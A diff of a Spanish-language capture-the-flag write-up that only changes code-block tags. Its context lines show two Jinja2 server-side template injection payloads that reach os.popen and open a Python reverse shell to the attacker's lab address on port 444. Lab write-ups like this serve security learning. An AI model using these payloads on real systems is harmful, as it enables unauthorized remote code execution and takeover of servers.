@@ -632,7 +632,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
 Cambié el payload del SSTI pero seguía sin llegarme ninguna shell.
-```python
+```python3
 {{% for x in ().__class__.__base__.__subclasses__() %}}
         {{% if "warning" in x.__name__ %}}
         {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{10.10.16.24}\\",{444}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
@@ -648,7 +648,7 @@ Entonces como URL a notificar vamos a poner que se tramite una petición GET a m
 `get://10.10.16.24:8082/notification`
 
 Y como payload vamos a usar uno genérico para mandarnos una revshell.
-```python
+```python3
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.24\",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
 ```
 ![Write-up Image](images/Screenshot_37.png)
